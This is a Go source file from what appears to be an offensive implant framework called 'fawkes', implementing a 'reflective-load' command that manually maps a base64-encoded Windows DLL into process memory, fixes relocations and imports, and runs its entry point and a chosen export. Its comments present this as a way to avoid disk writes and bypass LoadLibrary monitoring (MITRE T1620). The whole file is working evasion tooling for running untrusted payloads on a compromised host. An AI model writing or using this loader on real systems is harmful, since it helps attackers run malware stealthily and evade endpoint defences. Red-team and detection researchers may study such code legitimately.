//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

// ReflectiveLoadCommand loads a native PE (DLL/EXE) from memory into the current process.
// This avoids writing DLLs to disk and bypasses standard LoadLibrary monitoring.
// MITRE T1620 — Reflective Code Loading
type ReflectiveLoadCommand struct{}

func (c *ReflectiveLoadCommand) Name() string { return "reflective-load" }
func (c *ReflectiveLoadCommand) Description() string {
	return "Load a native PE (DLL) from memory into the current process without touching disk (T1620)"
}

type reflectiveLoadArgs struct {
	DllB64   string `json:"dll_b64"`
	Function string `json:"function"`
}

// PE constants
const (
	rlDOSSignature      = 0x5A4D     // "MZ"
	rlNTSignature       = 0x00004550 // "PE\0\0"
	rlMachineMD64       = 0x8664
	rlDLLCharacteristic = 0x2000

	rlSCNMemExecute = 0x20000000
	rlSCNMemRead    = 0x40000000
	rlSCNMemWrite   = 0x80000000

	rlRelBasedAbsolute = 0
	rlRelBasedDir64    = 10

	rlDirEntryImport    = 1
	rlDirEntryBaseReloc = 5

	rlDllProcessAttach = 1

	rlPageReadWrite   = 0x04
	rlPageReadOnly    = 0x02
	rlPageExecuteRead = 0x20
	rlPageExecuteRW   = 0x40
	rlPageNoAccess    = 0x01

	rlMemCommit  = 0x1000
	rlMemReserve = 0x2000
	rlMemRelease = 0x8000
)

// PE structures (reuses imageDOSHeader, imageFileHeader, imageSectionHeader from ntdll_unhook.go)

type rlDataDirectory struct {
	VirtualAddress uint32
	Size           uint32
}

type rlOptionalHeader64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]rlDataDirectory
}

type rlImportDescriptor struct {
	OriginalFirstThunk uint32
	TimeDateStamp      uint32
	ForwarderChain     uint32
	Name               uint32
	FirstThunk         uint32
}

type rlBaseRelocation struct {
	VirtualAddress uint32
	SizeOfBlock    uint32
}

// Win32 API procs (unique RL suffix to avoid conflicts)
var (
	procVirtualAllocRL   = kernel32.NewProc("VirtualAlloc")
	procVirtualFreeRL    = kernel32.NewProc("VirtualFree")
	procVirtualProtectRL = kernel32.NewProc("VirtualProtect")
	procLoadLibraryARL   = kernel32.NewProc("LoadLibraryA")
	procGetProcAddressRL = kernel32.NewProc("GetProcAddress")
	procFlushICacheRL    = kernel32.NewProc("FlushInstructionCache")
	procGetCurrentProcRL = kernel32.NewProc("GetCurrentProcess")
)

func (c *ReflectiveLoadCommand) Execute(task structs.Task) structs.CommandResult {
	var args reflectiveLoadArgs
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: dll_b64 parameter required (base64-encoded PE/DLL)",
			Status:    "error",
			Completed: true,
		}
	}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	if args.DllB64 == "" {
		return structs.CommandResult{
			Output:    "Error: dll_b64 is empty",
			Status:    "error",
			Completed: true,
		}
	}

	dllBytes, err := base64.StdEncoding.DecodeString(args.DllB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding DLL: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(dllBytes) < 64 {
		return structs.CommandResult{
			Output:    "Error: PE data too small",
			Status:    "error",
			Completed: true,
		}
	}

	return reflectiveLoad(dllBytes, args.Function)
}

func reflectiveLoad(peData []byte, exportFunc string) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var sb strings.Builder
	sb.WriteString("[*] Reflective PE Loader\n")

	// 1. Parse DOS header (reuses imageDOSHeader from ntdll_unhook.go)
	dosHeader := (*imageDOSHeader)(unsafe.Pointer(&peData[0]))
	if dosHeader.EMagic != rlDOSSignature {
		return structs.CommandResult{
			Output:    "Error: invalid PE — missing MZ signature",
			Status:    "error",
			Completed: true,
		}
	}

	ntOffset := dosHeader.ELfanew
	if ntOffset < 0 || int(ntOffset)+4 > len(peData) {
		return structs.CommandResult{
			Output:    "Error: invalid PE — bad NT header offset",
			Status:    "error",
			Completed: true,
		}
	}

	// 2. Parse NT headers (reuses imageFileHeader from ntdll_unhook.go)
	ntSig := binary.LittleEndian.Uint32(peData[ntOffset:])
	if ntSig != rlNTSignature {
		return structs.CommandResult{
			Output:    "Error: invalid PE — missing PE signature",
			Status:    "error",
			Completed: true,
		}
	}

	fileHeader := (*imageFileHeader)(unsafe.Pointer(&peData[ntOffset+4]))
	if fileHeader.Machine != rlMachineMD64 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: only x64 PE supported (machine: 0x%X)", fileHeader.Machine),
			Status:    "error",
			Completed: true,
		}
	}

	optHeaderOffset := ntOffset + 4 + int32(unsafe.Sizeof(imageFileHeader{}))
	optHeader := (*rlOptionalHeader64)(unsafe.Pointer(&peData[optHeaderOffset]))

	isDLL := (fileHeader.Characteristics & rlDLLCharacteristic) != 0
	sb.WriteString(fmt.Sprintf("[+] PE type: %s, sections: %d, entry RVA: 0x%X\n",
		map[bool]string{true: "DLL", false: "EXE"}[isDLL],
		fileHeader.NumberOfSections, optHeader.AddressOfEntryPoint))
	sb.WriteString(fmt.Sprintf("[+] Image size: %d bytes, preferred base: 0x%X\n",
		optHeader.SizeOfImage, optHeader.ImageBase))

	// 3. Allocate memory for the PE image (RW initially)
	allocBase, _, err := procVirtualAllocRL.Call(
		0,
		uintptr(optHeader.SizeOfImage),
		rlMemCommit|rlMemReserve,
		rlPageReadWrite,
	)
	if allocBase == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: VirtualAlloc failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated at 0x%X (size: %d)\n", allocBase, optHeader.SizeOfImage))

	// Ensure cleanup on failure
	loadSuccess := false
	defer func() {
		if !loadSuccess {
			procVirtualFreeRL.Call(allocBase, 0, rlMemRelease)
		}
	}()

	// 4. Copy headers (reuses copyMemory from beacon_api.go)
	copyMemory(allocBase, uintptr(unsafe.Pointer(&peData[0])), optHeader.SizeOfHeaders)

	// 5. Copy sections (reuses imageSectionHeader from ntdll_unhook.go)
	sectionOffset := optHeaderOffset + int32(fileHeader.SizeOfOptionalHeader)
	sections := make([]imageSectionHeader, fileHeader.NumberOfSections)
	for i := uint16(0); i < fileHeader.NumberOfSections; i++ {
		off := sectionOffset + int32(i)*int32(unsafe.Sizeof(imageSectionHeader{}))
		sections[i] = *(*imageSectionHeader)(unsafe.Pointer(&peData[off]))
		sec := &sections[i]

		if sec.SizeOfRawData > 0 {
			if sec.PointerToRawData+sec.SizeOfRawData > uint32(len(peData)) {
				return structs.CommandResult{
					Output:    fmt.Sprintf("Error: section %s extends beyond file", rlSectionName(sec.Name)),
					Status:    "error",
					Completed: true,
				}
			}
			dest := allocBase + uintptr(sec.VirtualAddress)
			src := uintptr(unsafe.Pointer(&peData[sec.PointerToRawData]))
			copyMemory(dest, src, sec.SizeOfRawData)
		}

		// Zero remaining virtual memory if VirtualSize > SizeOfRawData
		if sec.VirtualSize > sec.SizeOfRawData {
			zeroStart := allocBase + uintptr(sec.VirtualAddress) + uintptr(sec.SizeOfRawData)
			zeroSize := sec.VirtualSize - sec.SizeOfRawData
			rlZeroMemory(zeroStart, uintptr(zeroSize))
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped %d sections\n", fileHeader.NumberOfSections))

	// 6. Process base relocations
	delta := int64(allocBase) - int64(optHeader.ImageBase)
	if delta != 0 {
		relocDir := optHeader.DataDirectory[rlDirEntryBaseReloc]
		if relocDir.VirtualAddress > 0 && relocDir.Size > 0 {
			nRelocs, relocErr := rlProcessRelocations(allocBase, uintptr(relocDir.VirtualAddress), uintptr(relocDir.Size), delta)
			if relocErr != nil {
				return structs.CommandResult{
					Output:    sb.String() + fmt.Sprintf("Error processing relocations: %v", relocErr),
					Status:    "error",
					Completed: true,
				}
			}
			sb.WriteString(fmt.Sprintf("[+] Processed %d relocations (delta: 0x%X)\n", nRelocs, uint64(delta)))
		}
	} else {
		sb.WriteString("[+] Loaded at preferred base — no relocations needed\n")
	}

	// 7. Resolve imports
	importDir := optHeader.DataDirectory[rlDirEntryImport]
	if importDir.VirtualAddress > 0 && importDir.Size > 0 {
		nImports, importErr := rlResolveImports(allocBase, uintptr(importDir.VirtualAddress))
		if importErr != nil {
			return structs.CommandResult{
				Output:    sb.String() + fmt.Sprintf("Error resolving imports: %v", importErr),
				Status:    "error",
				Completed: true,
			}
		}
		sb.WriteString(fmt.Sprintf("[+] Resolved imports from %d DLLs\n", nImports))
	}

	// 8. Set section protections (W^X)
	for i := uint16(0); i < fileHeader.NumberOfSections; i++ {
		sec := &sections[i]
		prot := rlSectionProtection(sec.Characteristics)
		if prot == 0 {
			continue
		}
		var oldProt uint32
		procVirtualProtectRL.Call(
			allocBase+uintptr(sec.VirtualAddress),
			uintptr(sec.VirtualSize),
			uintptr(prot),
			uintptr(unsafe.Pointer(&oldProt)),
		)
	}
	sb.WriteString("[+] Set section protections\n")

	// 9. Flush instruction cache
	hProcess, _, _ := procGetCurrentProcRL.Call()
	procFlushICacheRL.Call(hProcess, allocBase, uintptr(optHeader.SizeOfImage))

	// 10. Call entry point (DllMain for DLLs)
	if isDLL && optHeader.AddressOfEntryPoint != 0 {
		entryPoint := allocBase + uintptr(optHeader.AddressOfEntryPoint)
		sb.WriteString(fmt.Sprintf("[*] Calling DllMain at 0x%X...\n", entryPoint))

		// DllMain(hModule, DLL_PROCESS_ATTACH, lpReserved)
		ret, _, _ := syscall.SyscallN(entryPoint, allocBase, rlDllProcessAttach, 0)
		if ret == 0 {
			sb.WriteString("[!] DllMain returned FALSE\n")
		} else {
			sb.WriteString("[+] DllMain returned TRUE\n")
		}
	}

	loadSuccess = true

	// 11. Call exported function if requested
	if exportFunc != "" {
		result, exportErr := rlCallExport(allocBase, peData, int(ntOffset), exportFunc)
		if exportErr != nil {
			sb.WriteString(fmt.Sprintf("[!] Export call failed: %v\n", exportErr))
		} else {
			sb.WriteString(fmt.Sprintf("[+] Called export '%s', returned: %d\n", exportFunc, result))
		}
	}

	sb.WriteString("[+] Reflective load complete\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func rlProcessRelocations(baseAddr uintptr, relocRVA, relocSize uintptr, delta int64) (int, error) {
	count := 0
	offset := uintptr(0)

	for offset < relocSize {
		block := (*rlBaseRelocation)(unsafe.Pointer(baseAddr + relocRVA + offset))
		if block.VirtualAddress == 0 || block.SizeOfBlock == 0 {
			break
		}

		numEntries := (block.SizeOfBlock - 8) / 2
		entriesPtr := baseAddr + relocRVA + offset + 8

		for i := uint32(0); i < numEntries; i++ {
			entry := *(*uint16)(unsafe.Pointer(entriesPtr + uintptr(i)*2))
			relocType := entry >> 12
			relocOffset := entry & 0xFFF

			switch relocType {
			case rlRelBasedAbsolute:
				// Padding, skip
			case rlRelBasedDir64:
				patchAddr := baseAddr + uintptr(block.VirtualAddress) + uintptr(relocOffset)
				val := *(*int64)(unsafe.Pointer(patchAddr))
				*(*int64)(unsafe.Pointer(patchAddr)) = val + delta
				count++
			default:
				return count, fmt.Errorf("unsupported relocation type %d", relocType)
			}
		}

		offset += uintptr(block.SizeOfBlock)
	}

	return count, nil
}

func rlResolveImports(baseAddr uintptr, importRVA uintptr) (int, error) {
	dllCount := 0
	descSize := unsafe.Sizeof(rlImportDescriptor{})

	for i := uintptr(0); ; i++ {
		desc := (*rlImportDescriptor)(unsafe.Pointer(baseAddr + importRVA + i*descSize))
		if desc.Name == 0 {
			break
		}

		// Read DLL name (null-terminated ASCII at RVA) — reuses readCString from beacon_api.go
		dllName := readCString(baseAddr + uintptr(desc.Name))

		// Load the DLL
		dllNameBytes := append([]byte(dllName), 0)
		hModule, _, err := procLoadLibraryARL.Call(uintptr(unsafe.Pointer(&dllNameBytes[0])))
		if hModule == 0 {
			return dllCount, fmt.Errorf("LoadLibrary(%s) failed: %v", dllName, err)
		}
		dllCount++

		// Walk import address table (IAT) and import name table (INT)
		thunkRVA := desc.OriginalFirstThunk
		if thunkRVA == 0 {
			thunkRVA = desc.FirstThunk // No INT, use IAT
		}
		iatRVA := desc.FirstThunk

		for j := uintptr(0); ; j++ {
			thunkPtr := baseAddr + uintptr(thunkRVA) + j*8
			iatPtr := baseAddr + uintptr(iatRVA) + j*8

			thunkVal := *(*uint64)(unsafe.Pointer(thunkPtr))
			if thunkVal == 0 {
				break
			}

			var funcAddr uintptr
			if thunkVal&0x8000000000000000 != 0 {
				// Import by ordinal
				ordinal := uint16(thunkVal & 0xFFFF)
				funcAddr, _, err = procGetProcAddressRL.Call(hModule, uintptr(ordinal))
			} else {
				// Import by name — IMAGE_IMPORT_BY_NAME: 2-byte Hint + name
				nameRVA := uint32(thunkVal)
				funcName := readCString(baseAddr + uintptr(nameRVA) + 2) // skip hint
				funcNameBytes := append([]byte(funcName), 0)
				funcAddr, _, err = procGetProcAddressRL.Call(hModule, uintptr(unsafe.Pointer(&funcNameBytes[0])))
			}

			if funcAddr == 0 {
				return dllCount, fmt.Errorf("GetProcAddress failed for import in %s: %v", dllName, err)
			}

			// Write resolved address into IAT
			*(*uintptr)(unsafe.Pointer(iatPtr)) = funcAddr
		}
	}

	return dllCount, nil
}

func rlCallExport(baseAddr uintptr, peData []byte, ntOffset int, funcName string) (uintptr, error) {
	optHeaderOff := ntOffset + 4 + int(unsafe.Sizeof(imageFileHeader{}))
	optHeader := (*rlOptionalHeader64)(unsafe.Pointer(&peData[optHeaderOff]))

	// Export directory is index 0
	exportDir := optHeader.DataDirectory[0]
	if exportDir.VirtualAddress == 0 || exportDir.Size == 0 {
		return 0, fmt.Errorf("no export directory in PE")
	}

	type rlExportDirectory struct {
		Characteristics       uint32
		TimeDateStamp         uint32
		MajorVersion          uint16
		MinorVersion          uint16
		Name                  uint32
		Base                  uint32
		NumberOfFunctions     uint32
		NumberOfNames         uint32
		AddressOfFunctions    uint32
		AddressOfNames        uint32
		AddressOfNameOrdinals uint32
	}

	expDir := (*rlExportDirectory)(unsafe.Pointer(baseAddr + uintptr(exportDir.VirtualAddress)))

	for i := uint32(0); i < expDir.NumberOfNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(baseAddr + uintptr(expDir.AddressOfNames) + uintptr(i)*4))
		name := readCString(baseAddr + uintptr(nameRVA))

		if name == funcName {
			ordinal := *(*uint16)(unsafe.Pointer(baseAddr + uintptr(expDir.AddressOfNameOrdinals) + uintptr(i)*2))
			funcRVA := *(*uint32)(unsafe.Pointer(baseAddr + uintptr(expDir.AddressOfFunctions) + uintptr(ordinal)*4))
			funcAddr := baseAddr + uintptr(funcRVA)

			ret, _, _ := syscall.SyscallN(funcAddr)
			return ret, nil
		}
	}

	return 0, fmt.Errorf("export '%s' not found", funcName)
}

func rlSectionProtection(characteristics uint32) uint32 {
	isExec := (characteristics & rlSCNMemExecute) != 0
	isRead := (characteristics & rlSCNMemRead) != 0
	isWrite := (characteristics & rlSCNMemWrite) != 0

	switch {
	case isExec && isRead && isWrite:
		return rlPageExecuteRW
	case isExec && isRead:
		return rlPageExecuteRead
	case isExec:
		return rlPageExecuteRead
	case isRead && isWrite:
		return rlPageReadWrite
	case isRead:
		return rlPageReadOnly
	default:
		return rlPageNoAccess
	}
}

func rlZeroMemory(addr uintptr, size uintptr) {
	mem := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
	for i := range mem {
		mem[i] = 0
	}
}

func rlSectionName(name [8]byte) string {
	n := 0
	for i, b := range name {
		if b == 0 {
			break
		}
		n = i + 1
	}
	return string(name[:n])
}
